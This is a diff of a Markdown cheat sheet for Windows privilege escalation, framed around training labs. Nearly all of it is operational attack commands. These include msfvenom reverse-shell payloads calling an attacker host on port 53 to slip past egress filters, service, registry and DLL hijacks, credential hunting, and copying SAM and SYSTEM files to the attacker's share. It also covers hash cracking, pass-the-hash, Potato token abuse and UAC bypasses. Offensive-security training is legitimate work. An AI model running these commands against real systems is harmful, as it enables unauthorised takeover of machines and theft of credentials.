@@ -1,167 +1,368 @@
 # Windows Privilege Escalation Cheat Sheet
-> Based on the TryHackMe Windows PrivEsc lab. Covers all 17 tasks plus additional real-world techniques.
+> Based on the Immersive Labs Windows Privilege Escalation series and TryHackMe Windows PrivEsc Arena.
 
 ---
 
 ## Table of Contents
+- [Account Types and Concepts](#account-types-and-concepts)
 - [Setup](#setup)
+- [Manual Enumeration](#manual-enumeration)
+- [Automated Enumeration](#automated-enumeration)
+- [Finding Passwords](#finding-passwords)
 - [Service Exploits](#service-exploits)
 - [Registry](#registry)
-- [Credential Attacks](#credential-attacks)
-- [Scheduled Tasks & Startup](#scheduled-tasks--startup)
+- [DLL Hijacking](#dll-hijacking)
 - [Token Impersonation](#token-impersonation)
+- [Credential Attacks](#credential-attacks)
+- [Scheduled Tasks and Startup](#scheduled-tasks-and-startup)
 - [Miscellaneous Techniques](#miscellaneous-techniques)
+- [Payload Generation and Listener](#payload-generation-and-listener)
 - [Quick Reference Table](#quick-reference-table)
+
+---
+
+## Account Types and Concepts
+
+| Account | Description |
+|---|---|
+| Standard User | Limited access, permissions-based. Typical foothold account. |
+| Administrator | Full local access. Member of Administrators group. Interactive. |
+| SYSTEM | Highest privilege. Non-interactive. Runs most services. |
+| LocalSystem | Alias for SYSTEM — same SID, same privileges. Appears in service configs. |
+
+**Vertical escalation** — low-priv user to SYSTEM/Administrator on the same machine.  
+**Horizontal escalation** — low-priv user to a different user account (pivoting).
+
+**Universal privilege escalation question: can I write to it, and does something higher-privileged execute it?**
 
 ---
 
 ## Setup
 
-### Generate a Reverse Shell Executable
-**What it does:** Creates a standalone reverse shell binary using msfvenom and transfers it to the target via SMB.
-
-> Port 53 (DNS) is used to blend in and bypass common egress firewall rules. Keep `reverse.exe` — it is reused in nearly every technique.
-
+### Transfer tools to target
 ```bash
-# Generate payload (Kali)
+# Kali: serve tools directory
+cd /home/kali/Desktop/Tools/Windows
+sudo python3 -m http.server 80
+```
+On Windows target, browse to `http://[KALI-IP]` and download what you need.
+
+### Transfer via SMB
+```bash
+# Kali: host current directory over SMB
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
+```
+```cmd
+# Windows: copy from SMB share
+copy \\<KALI_IP>\kali\reverse.exe C:\PrivEsc\reverse.exe
+```
+
+### Generate reverse shell executable
+```bash
+# EXE — for service exploits and general use
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=53 -f exe -o reverse.exe
 
-# Host via SMB (Kali — run in same directory as reverse.exe)
-sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
+# DLL — for DLL hijacking
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=53 -f dll -o target.dll
 
-# Transfer to target (Windows)
-copy \\<KALI_IP>\kali\reverse.exe C:\PrivEsc\reverse.exe
+# MSI — for AlwaysInstallElevated
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=53 -f msi -o reverse.msi
 
-# Start listener (Kali)
+# Meterpreter variant (if using Metasploit listener)
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f exe -o reverse.exe
+```
+
+> Port 53 (DNS) blends in and bypasses common egress firewall rules.
+
+### Start a listener
+```bash
+# Netcat
 sudo nc -nvlp 53
 
-# Execute (Windows)
-C:\PrivEsc\reverse.exe
+# Metasploit
+msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost <KALI_IP>; set lport 4444; exploit"
+```
+
+### Migrate Meterpreter session (do this immediately)
+```meterpreter
+migrate -N LogonUI.exe
+```
+> Approximately 60 seconds before a fake service process is killed. Migrate first.
+
+---
+
+## Manual Enumeration
+
+### System and user recon
+```cmd
+whoami
+whoami /priv
+whoami /groups
+net users
+net user [username]
+net localgroup
+net localgroup administrators
+systeminfo
+hostname
+```
+
+### Services and tasks
+```cmd
+net start                          # running services
+tasklist /SVC                      # processes linked to services
+tasklist /V                        # includes running user — useful for GUI app escalation
+wmic service list brief
+wmic service where (state="running") get name, caption, startmode, startname
+schtasks /query /fo LIST /v        # all scheduled tasks
+```
+
+### GUI tools
+```cmd
+lusrmgr.msc    # local users and groups
+msinfo32       # full system info
+regedit        # registry editor
+taskmgr        # task manager (shows SYSTEM processes)
+```
+
+### PowerShell history
+```powershell
+history    # current session
+```
+Saved history file — open via Run (Win+R):
+```
+%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+```
+
+### Startup folders
+```
+C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
+C:\Users\[user]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+```
+
+### Registry run keys
+```
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+```
+
+> Startup folder payloads run as the authenticating user, not SYSTEM. Scheduled tasks can run as SYSTEM and are a higher value target.
+
+### Installed software
+```cmd
+wmic /OUTPUT:software.txt product get name
 ```
 
 ---
 
-### PrivEsc Enumeration Scripts
-**What it does:** Automated tools that surface misconfigurations, weak permissions, and credential exposures quickly. Always run these first on a new foothold.
+## Automated Enumeration
 
+### WinPEAS
 ```cmd
+winpeas.exe
+winpeas.exe notcolor log    # output to out.txt, no colour codes
 .\winPEASany.exe
-.\Seatbelt.exe -group=all
+```
+Red text = misconfiguration or special privilege. Key sections: CVE suggestions, modifiable services, accessible home folders, files containing "password" in the name.
+
+### PowerUp
+```powershell
+Import-Module ./PowerUp.ps1
+Invoke-AllChecks
 . .\PowerUp.ps1; Invoke-AllChecks
+Get-Help [cmdlet] --full
+```
+
+### Seatbelt
+```cmd
+Seatbelt.exe -group=all
+Seatbelt.exe -group=all > output.txt
+.\Seatbelt.exe -group=all
+```
+Key sections: AutoRuns and LOLBAS.
+
+### SharpUp
+```cmd
 .\SharpUp.exe audit
 ```
 
-> **winPEAS** is the most comprehensive. **PowerUp** is best for service misconfigs. **Seatbelt** focuses on security posture checks.
+> Automated tools give you leads, not answers. Always manually verify before attempting to exploit.
+
+---
+
+## Finding Passwords
+
+### Search file contents by keyword
+```cmd
+cd C:\
+findstr /m /s /i password *.txt
+findstr /m /s /i password *.xml *.ini
+findstr /m /s /i password *.ps1
+findstr /m /s /i secret *.txt
+findstr /m /s /i username *.txt
+findstr /m /s /i credentials *.txt
+```
+
+Multi-keyword loop using a wordlist:
+```cmd
+for /F %i in (wordlist.txt) do ( findstr /M /C:%i /S *.txt )
+```
+
+### Search filenames by keyword
+```cmd
+dir /s *pass* == *cred* == *secret*
+dir /s *config* == *configuration* == *conf*
+```
+
+### Registry credential search
+```cmd
+reg query HKCU /f password /t REG_SZ /s
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f credentials /t REG_SZ /s
+reg query HKCU /f secret /t REG_SZ /s
+```
+
+### Saved RDP connections
+```cmd
+# Current user
+reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers"
+reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers\[IP]"
+
+# Other users — get SIDs first
+reg query "HKEY_USERS"
+reg query "HKEY_USERS\[SID]\Software\Microsoft\Terminal Server Client\Servers"
+```
+Look for `UsernameHint` values. Blocked if Credential Guard is enabled.
+
+### AutoLogon credentials in registry
+```cmd
+reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+```
+Look for `DefaultUsername` and `DefaultPassword` values stored in plaintext.
+
+### PowerShell scripts
+Check `.ps1` files for `Get-Content` references — even if no plaintext password exists in the script, it may point to a file that contains one.
+
+> Base64 is not encryption. Decode any base64 strings immediately:
+> ```powershell
+> [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String($encodedString))
+> ```
+> ```bash
+> echo "[base64string]" | base64 -d
+> ```
 
 ---
 
 ## Service Exploits
 
-### Insecure Service Permissions
-**What it does:** If your user has `SERVICE_CHANGE_CONFIG` on a service running as SYSTEM, you can redirect its binary path to your reverse shell.
-
-**Look for:** `SERVICE_CHANGE_CONFIG` in accesschk output. `SERVICE_START_NAME : LocalSystem` in sc qc output.
+### Insecure service permissions
+If your user has `SERVICE_CHANGE_CONFIG` on a service running as SYSTEM, redirect its binary path to your reverse shell.
 
 ```cmd
 # Check user permissions on the service
-C:\PrivEsc\accesschk.exe /accepteula -uwcqv user <servicename>
+accesschk.exe /accepteula -uwcqv user <servicename>
+accesschk.exe -uwcqv "[username]" *
 
 # Confirm service runs as SYSTEM
 sc qc <servicename>
 
-# Redirect binary path to reverse shell
+# Redirect binary path
 sc config <servicename> binpath= "\"C:\PrivEsc\reverse.exe\""
-
-# Start listener on Kali, then trigger
-net start <servicename>
+sc stop <servicename>
+sc start <servicename>
 ```
 
----
+Look for: `SERVICE_CHANGE_CONFIG` or `SERVICE_ALL_ACCESS`. `SERVICE_START_NAME: LocalSystem` in sc qc output.
 
-### Unquoted Service Path
-**What it does:** When a service binary path is unquoted and contains spaces, Windows tries multiple path interpretations before finding the real binary. Plant your shell at the first writable resolved path.
-
-**Look for:** `BINARY_PATH_NAME` with spaces and no surrounding quotes. Write access to one of the intermediate directories.
-
-**How Windows resolves `C:\Program Files\Unquoted Path Service\Common Files\service.exe`:**
-```
-C:\Program.exe                                             <- tried first
-C:\Program Files\Unquoted.exe                             <- tried second
-C:\Program Files\Unquoted Path Service\Common.exe         <- plant here
-C:\Program Files\Unquoted Path Service\Common Files\service.exe
-```
+### Unquoted service path
+Windows tries multiple path interpretations when a service binary path has spaces and no quotes. Plant your shell at the first writable resolved path.
 
 ```cmd
 # Find all unquoted service paths
 wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
 
 # Check write access to the directory
-C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
+accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
+icacls "C:\Program Files\Unquoted Path Service\"
 
 # Plant reverse shell with the correct name
 copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
 
-# Start listener on Kali, then trigger
 net start <servicename>
 ```
 
----
+**How Windows resolves `C:\Program Files\Unquoted Path Service\Common Files\service.exe`:**
+```
+C:\Program.exe                                              <- tried first
+C:\Program Files\Unquoted.exe                              <- tried second
+C:\Program Files\Unquoted Path Service\Common.exe          <- plant here if writable
+C:\Program Files\Unquoted Path Service\Common Files\service.exe
+```
 
-### Weak Registry Permissions
-**What it does:** If the registry key for a service is writable, overwrite `ImagePath` to point to your reverse shell. The SCM reads this at start time — no need to touch sc config.
+**Payload naming logic — name matches last word before the space at your writable level:**
 
-**Look for:** `NT AUTHORITY\INTERACTIVE` or `BUILTIN\Users` with `KEY_SET_VALUE` or `KEY_ALL_ACCESS` on the service registry key.
+| Writable folder | Payload name |
+|---|---|
+| `C:\` | `Program.exe` |
+| `C:\Program Files\` | `Custom.exe` |
+| `C:\Program Files\Custom Service\` | `Example.exe` |
+
+### Weak registry permissions
+If the registry key for a service is writable, overwrite `ImagePath` to point to your reverse shell.
 
 ```cmd
 # Check registry key permissions
-C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\<servicename>
+accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\<servicename>
+accesschk.exe /accepteula "[username]" -kvuqsw HKLM\System\CurrentControlSet\Services
 
-# Overwrite ImagePath
+# PowerShell alternative
+Get-Acl "HKLM:\SYSTEM\CurrentControlSet\Services\*" | Format-List * | Out-String | Set-Content -Path $HOME\Desktop\output.txt
+
+# Confirm the service
+reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\<servicename>
+
+# Overwrite ImagePath via reg command
 reg add HKLM\SYSTEM\CurrentControlSet\services\<servicename> /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
 
-# Start listener on Kali, then trigger
-net start <servicename>
+# Or overwrite via regedit — navigate to the key and edit ImagePath directly
 ```
+
+Look for: `KEY_ALL_ACCESS`, `KEY_SET_VALUE`, or `KEY_WRITE`. Check `ObjectName` (must be LocalSystem), `Start` value (`0x2` = AutoStart).
 
 > `NT AUTHORITY\INTERACTIVE` covers all users with an active interactive or RDP session — a broad and often overlooked permission.
 
----
-
-### Insecure Service Executable
-**What it does:** When the service binary file itself is world-writable, simply replace it with your reverse shell. The SCM doesn't verify integrity — it just runs whatever is at the configured path.
-
-**Look for:** `Everyone` or `BUILTIN\Users` with `FILE_ALL_ACCESS` or `FILE_WRITE_DATA` on the service binary.
+### Insecure service executable
+When the service binary file itself is world-writable, replace it with your reverse shell directly.
 
 ```cmd
 # Check file permissions
-C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
+accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
+icacls "C:\Program Files\File Permissions Service\filepermservice.exe"
 
-# Replace binary with reverse shell
+# Replace binary
 copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
 
-# Start listener on Kali, then trigger
 net start <servicename>
 ```
 
----
+Look for: `Everyone` or `BUILTIN\Users` with `FILE_ALL_ACCESS` or `FILE_WRITE_DATA`.
 
-### Service Exploit Comparison
+### Service exploit comparison
 
 | Technique | What is weak | Method |
-|-----------|-------------|--------|
+|---|---|---|
 | Insecure service permissions | Service object ACL | `sc config` binpath |
 | Unquoted service path | Unquoted path + writable directory | Plant binary at resolved path |
-| Weak registry ACL | Registry key ACL | `reg add` ImagePath |
+| Weak registry ACL | Registry key ACL | `reg add` ImagePath or regedit |
 | Insecure service executable | Binary file ACL | Overwrite `.exe` directly |
 
 ---
 
 ## Registry
 
-### AutoRun Binary Hijack
-**What it does:** AutoRun entries execute automatically on user logon. If the referenced binary is writable and a privileged user logs in, you get a shell running with their privileges.
-
-**Look for:** Writable executables listed under the AutoRun registry keys below.
+### AutoRun binary hijack
+AutoRun entries execute automatically on user logon. If the referenced binary is writable and a privileged user logs in, you get a shell with their privileges.
 
 ```cmd
 # Find AutoRun entries
@@ -171,95 +372,150 @@ reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
 reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
 
 # Check write access on the binary
-C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
+accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
 
 # Replace with reverse shell
 copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
-
-# Start listener on Kali, then trigger by opening a new RDP session (fires on logon)
-rdesktop <TARGET_IP>
 ```
-
----
+Trigger by opening a new RDP session — fires on logon.
 
 ### AlwaysInstallElevated
-**What it does:** When both HKLM and HKCU `AlwaysInstallElevated` keys are set to `1`, Windows Installer runs all `.msi` packages as SYSTEM — regardless of who triggers them.
-
-**Look for:** Both registry keys returning `0x1`. If either is missing or `0` this technique will not work.
+When both HKLM and HKCU `AlwaysInstallElevated` keys are set to `1`, Windows Installer runs all `.msi` packages as SYSTEM regardless of who triggers them.
 
 ```cmd
-# Check both keys — both must return 0x1
+# Both must return 0x1
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 ```
-
 ```bash
-# Generate malicious .msi payload (Kali)
+# Generate malicious MSI (Kali)
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=53 -f msi -o reverse.msi
-
-# Transfer to target using SMB (same method as setup)
 ```
-
 ```cmd
-# Start listener on Kali, then run the installer (Windows)
+# Execute on Windows
 msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
 ```
 
 ---
 
-## Credential Attacks
+## DLL Hijacking
 
-### Plaintext Credentials in Registry
-**What it does:** AutoLogon stores credentials in plaintext under the Winlogon registry key. Admins sometimes configure this for convenience, leaving credentials exposed to any user.
+### Three variants
 
-**Look for:** `DefaultPassword` value under the Winlogon key, or any `REG_SZ` values containing the word "password".
+| Type | Condition | Action |
+|---|---|---|
+| Weak DLL permissions | You can write to the DLL file itself | Overwrite it directly |
+| Search order hijack | You can write to a folder earlier in the search order | Plant DLL with same name higher up |
+| Missing DLL | DLL does not exist anywhere | Plant DLL anywhere in the search order |
 
+### DLL search order
+1. Folder containing the executable
+2. `C:\Windows\System32`
+3. `C:\Windows\System`
+4. `C:\Windows`
+5. Current directory
+6. Directories in the system PATH
+7. Directories in the user PATH
+
+### Find missing DLLs with Procmon
+Add the following filters:
+- Result → is → `NAME NOT FOUND`
+- Path → ends with → `.dll`
+- User → contains → `SYSTEM` (or `Administrator`)
+
+Double-click a result and open the Process tab to confirm a privileged user is running the process.
+
+### Check write permissions on DLL search paths
 ```cmd
-# Targeted check for AutoLogon credentials
-reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
-
-# Broad search across entire HKLM (slow but thorough)
-reg query HKLM /f password /t REG_SZ /s
+icacls "C:\Program Files\Backup Files\Daily Backup"
+accesschk.exe /accepteula -uwdq "C:\Some\Writable\Dir\"
 ```
 
 ```bash
-# Use found credentials to spawn a shell (Kali)
-winexe -U 'admin%<PASSWORD>' //<TARGET_IP> cmd.exe
+# Generate malicious DLL (Kali)
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=53 -f dll -o missing.dll
+```
+```cmd
+# Place in the writable directory with the exact expected name
+copy missing.dll "C:\Some\Writable\Dir\missing.dll"
 ```
 
 ---
 
-### Saved Credentials (runas)
-**What it does:** Windows can cache credentials used with `runas`. If admin credentials are saved, you can run any process as that user with no password prompt.
+## Token Impersonation
 
-**Look for:** `cmdkey /list` showing saved entries for privileged accounts.
+> All techniques in this section require `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`, commonly held by service accounts, IIS app pools, and MSSQL service users.
+
+```cmd
+# Check for impersonation privileges
+whoami /priv
+whoami /priv | findstr /i "impersonate\|assignprimarytoken"
+```
+
+### PrintSpoofer
+Tricks the Print Spooler service (SYSTEM) into authenticating to a fake named pipe, then impersonates the captured SYSTEM token.
+
+```cmd
+# Get a service account shell first (simulate via PSExec in labs)
+PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
+
+# In the service account shell
+C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i
+```
+
+Look for: `SeImpersonatePrivilege` enabled. Print Spooler service must be running (`sc query spooler`).
+
+### RoguePotato
+Forces a SYSTEM-level DCOM process to authenticate to a rogue server on Kali. Use as a fallback when PrintSpoofer is not viable.
+
+```bash
+# Set up socat redirector on Kali
+sudo socat tcp-listen:135,reuseaddr,fork tcp:<TARGET_IP>:9999
+
+# Start second listener
+sudo nc -nvlp 53
+```
+```cmd
+# In the service account shell
+C:\PrivEsc\RoguePotato.exe -r <KALI_IP> -e "C:\PrivEsc\reverse.exe" -l 9999
+```
+
+### Potato variant comparison
+
+| Tool | Best for | Notes |
+|---|---|---|
+| PrintSpoofer | Windows 10 / Server 2016+ | No redirector needed. Requires Print Spooler running. |
+| RoguePotato | Windows 10 / Server 2016+ | Needs socat redirector. Good fallback. |
+| GodPotato | Windows 10/11 / Server 2019/2022 | Most modern option. |
+| SweetPotato | Windows 10 / Server 2016/2019 | Combines multiple techniques. |
+| JuicyPotato | Pre-Server 2019 | Older systems. Requires specific CLSID. |
+| HotPotato | Windows 7/8 / early Win 10 | NBNS/WPAD spoofing based. |
+
+---
+
+## Credential Attacks
+
+### Saved credentials (runas)
+Windows can cache credentials used with `runas`. If admin credentials are saved, run any process as that user with no password prompt.
 
 ```cmd
 # List saved credentials
 cmdkey /list
 
-# If no saved creds, refresh them
-C:\PrivEsc\savecred.bat
-
-# Start listener on Kali, then run reverse shell as admin using saved creds
+# Run reverse shell as admin using saved credentials
 runas /savecred /user:admin C:\PrivEsc\reverse.exe
 ```
 
----
-
-### SAM Database Dump
-**What it does:** The SAM file stores NTLM password hashes, encrypted with a boot key stored in the SYSTEM file. With both files you can extract and crack hashes offline.
-
-**Look for:** SAM and SYSTEM backup files in `C:\Windows\Repair\` or `C:\Windows\System32\config\RegBack\`.
+### SAM database dump
+The SAM file stores NTLM password hashes, encrypted with a boot key in the SYSTEM file. With both files you can extract and crack hashes offline.
 
 ```cmd
 # Transfer SAM and SYSTEM files to Kali
 copy C:\Windows\Repair\SAM \\<KALI_IP>\kali\
 copy C:\Windows\Repair\SYSTEM \\<KALI_IP>\kali\
 ```
-
 ```bash
-# Use Tib3rius creddump7 fork — the Kali default is outdated for Windows 10
+# Dump hashes (use Tib3rius creddump7 — Kali default is outdated for Win 10)
 git clone https://github.com/Tib3rius/creddump7
 pip3 install pycrypto
 python3 creddump7/pwdump.py SYSTEM SAM
@@ -271,15 +527,10 @@ hashcat -m 1000 --force <HASH> /usr/share/wordlists/rockyou.txt
 winexe -U 'admin%<PASSWORD>' //<TARGET_IP> cmd.exe
 ```
 
----
-
 ### Pass the Hash
-**What it does:** NTLM authentication accepts the hash itself as proof of identity. You never need the plaintext password — authenticate directly with the raw hash.
-
-**Look for:** Any obtained NTLM hash. The full hash is `LM:NTLM` — both parts separated by a colon.
+NTLM authentication accepts the hash itself as proof of identity. You never need the plaintext password.
 
 ```bash
-# Spawn shell using hash (Kali)
 pth-winexe -U 'admin%<LM:NTLM_HASH>' //<TARGET_IP> cmd.exe
 
 # Alternatives
@@ -288,193 +539,118 @@ impacket-wmiexec admin@<TARGET_IP> -hashes <LM:NTLM>
 crackmapexec smb <TARGET_IP> -u admin -H <NTLM> -x whoami
 ```
 
+The full hash format is `LM:NTLM` — both parts separated by a colon.
+
+### Use found credentials for remote shell
+```bash
+winexe -U 'admin%<PASSWORD>' //<TARGET_IP> cmd.exe
+```
+
 ---
 
-## Scheduled Tasks & Startup
+## Scheduled Tasks and Startup
 
-### Writable Scheduled Task Script
-**What it does:** If a scheduled task runs as SYSTEM and executes a script you can write to, append your reverse shell command. Wait for the next scheduled run to get a SYSTEM shell.
-
-**Look for:** Tasks running as SYSTEM with scripts or binaries in writable locations.
+### Writable scheduled task script
+If a scheduled task runs as SYSTEM and executes a script you can write to, append your reverse shell command.
 
 ```cmd
 # Enumerate scheduled tasks
+schtasks /query /fo LIST /v
 schtasks /query /fo LIST /v | findstr /i "task name\|run as\|task to run"
 
 # Check write access on the script
-C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
+accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
 
 # Append reverse shell command
 echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
-
-# Start listener on Kali and wait for the task to fire
-sudo nc -nvlp 53
 ```
+Wait for the next scheduled run or trigger manually if you have permissions.
 
----
-
-### Writable Startup Folder
-**What it does:** Files in the global StartUp folder execute for every user at logon. If `BUILTIN\Users` can write there, plant a shortcut to your reverse shell — it fires when any admin logs in.
-
-**Look for:** `BUILTIN\Users` with `FILE_ADD_FILE` or `FILE_ALL_ACCESS` on the StartUp directory.
+### Writable startup folder
+Files in the global StartUp folder execute for every user at logon. Plant a reverse shell — it fires when any admin logs in.
 
 ```cmd
 # Check write access
-C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
 
-# Create shortcut (VBS script provided by the lab)
-cscript C:\PrivEsc\CreateShortcut.vbs
-
-# Start listener on Kali, then trigger with an admin RDP logon
-rdesktop -u admin <TARGET_IP>
+# Copy reverse shell or create shortcut
+copy C:\PrivEsc\reverse.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.exe"
 ```
-
----
-
-## Token Impersonation
-
-> All techniques in this section require `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`, which are commonly held by service accounts, IIS application pools, and MSSQL service users.
-
-```cmd
-# Check for impersonation privileges
-whoami /priv | findstr /i "impersonate\|assignprimarytoken"
-```
-
----
-
-### PrintSpoofer
-**What it does:** Tricks the Print Spooler service (SYSTEM) into authenticating to a fake named pipe. Captures the SYSTEM token and impersonates it. Simpler than Potato attacks — no redirector needed.
-
-**Look for:** `SeImpersonatePrivilege` enabled. Print Spooler service must be running (`sc query spooler`).
-
-```bash
-# Get a service account shell to work from (simulate via PSExec in the lab)
-C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
-```
-
-```cmd
-# In the service account shell — start listener on Kali first
-C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i
-```
-
----
-
-### RoguePotato
-**What it does:** Forces a SYSTEM-level DCOM process to authenticate to a rogue server on Kali. Captures and impersonates the token. Use as a fallback when PrintSpoofer is not viable.
-
-**Look for:** `SeImpersonatePrivilege` enabled. Requires a socat redirector on Kali.
-
-```bash
-# Set up socat redirector — forwards Kali port 135 to Windows port 9999 (Kali)
-sudo socat tcp-listen:135,reuseaddr,fork tcp:<TARGET_IP>:9999
-
-# Get a service account shell (simulate via PSExec in the lab)
-C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
-
-# Start second listener on Kali
-sudo nc -nvlp 53
-```
-
-```cmd
-# In the service account shell
-C:\PrivEsc\RoguePotato.exe -r <KALI_IP> -e "C:\PrivEsc\reverse.exe" -l 9999
-```
-
----
-
-### Potato Attack Variants
-
-| Tool | Best for | Notes |
-|------|---------|-------|
-| PrintSpoofer | Windows 10 / Server 2016+ | No redirector needed. Requires Print Spooler running. |
-| RoguePotato | Windows 10 / Server 2016+ | Needs socat redirector. Good fallback. |
-| GodPotato | Windows 10/11 / Server 2019/2022 | Most modern option. |
-| SweetPotato | Windows 10 / Server 2016/2019 | Combines multiple techniques. |
-| JuicyPotato | Pre-Server 2019 | Older systems. Requires specific CLSID. |
-| HotPotato | Windows 7/8 / early Win 10 | NBNS/WPAD spoofing based. |
+Trigger by opening a new RDP session as admin.
 
 ---
 
 ## Miscellaneous Techniques
 
-### Insecure GUI Application
-**What it does:** GUI applications running as admin expose file open/save dialogs. Use the dialog's address bar to launch `cmd.exe` — it inherits the elevated context of the parent application.
+### UAC bypass
+If you have a medium-integrity admin session, UAC blocks full admin access. Bypasses elevate your process to high integrity without triggering a prompt.
 
-**Look for:** Applications visible in `tasklist /V` running under an admin account, accessible over RDP.
+```cmd
+# Check current integrity level
+whoami /groups | findstr /i "medium\|high\|administrators"
+
+# Common bypass methods
+eventvwr.exe      # environment variable hijack — Windows 7 to 10
+fodhelper.exe     # registry hijack — Windows 10
+CMSTP.exe         # INF file based
+```
+Automated tool covering many bypass techniques: https://github.com/hfiref0x/UACME
+
+### Insecure GUI application
+GUI applications running as admin expose file open/save dialogs. Use the address bar to launch `cmd.exe` — it inherits the elevated context of the parent application.
 
 ```cmd
 # Confirm the app is running as admin
 tasklist /V | findstr mspaint.exe
 
 # In the app: File > Open
-# Click the address/navigation bar and paste:
+# Click the address/navigation bar and type:
 file://c:/windows/system32/cmd.exe
-# Press Enter to spawn an admin cmd prompt
 ```
 
----
-
-### DLL Hijacking
-**What it does:** When a privileged process loads a DLL from a writable directory, or searches PATH before reaching the legitimate DLL, you can plant a malicious replacement that executes with the process's privileges.
-
-**Look for:** `NAME NOT FOUND` results for `.dll` files in Process Monitor where the search path includes a writable directory. Missing DLLs in writable locations on `%PATH%`.
-
-```cmd
-# Use Process Monitor (filter: Path ends with .dll AND Result is NAME NOT FOUND)
-procmon.exe
-
-# Check if the missing DLL's directory is writable
-C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Some\Writable\Dir\"
-```
-
-```bash
-# Generate malicious DLL (Kali)
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=53 -f dll -o hijack.dll
-```
-
-```cmd
-# Place DLL in the writable directory with the expected name
-copy hijack.dll "C:\Some\Writable\Dir\missing.dll"
-```
-
----
-
-### UAC Bypass
-**What it does:** If you have a medium-integrity admin session, UAC blocks full admin access. Bypasses elevate your process to high integrity without triggering a UAC prompt.
-
-**Look for:** `whoami /groups` showing `Mandatory Label\Medium Mandatory Level` while the user is in the `Administrators` group.
-
-```cmd
-# Check current integrity level and group membership
-whoami /groups | findstr /i "medium\|high\|administrators"
-
-# Common bypass methods
-eventvwr.exe          # Environment variable hijack — Windows 7 to 10
-fodhelper.exe         # Registry hijack — Windows 10
-CMSTP.exe             # INF file based — works on many versions
-```
-
-```
-# Automated tool covering many bypass techniques
-https://github.com/hfiref0x/UACME
-```
-
----
-
-### Weak File and Folder Permissions (General)
-**What it does:** Beyond service binaries, any executable run by a privileged process or scheduled task that you can overwrite is a potential vector. Always audit files executed by SYSTEM or admin accounts.
-
-**Look for:** `Everyone` or `BUILTIN\Users` with write access on files or directories used by privileged processes.
+### Weak file and folder permissions (general)
+Any executable run by a privileged process that you can overwrite is a potential vector.
 
 ```cmd
 # Check directory permissions
-C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\SomeDirectory\"
+accesschk.exe /accepteula -uwdq "C:\SomeDirectory\"
 
 # Check file permissions
-C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\SomePath\file.exe"
-
-# Alternative using built-in icacls
+accesschk.exe /accepteula -quvw "C:\SomePath\file.exe"
 icacls "C:\SomePath\file.exe"
+```
+
+---
+
+## Payload Generation and Listener
+
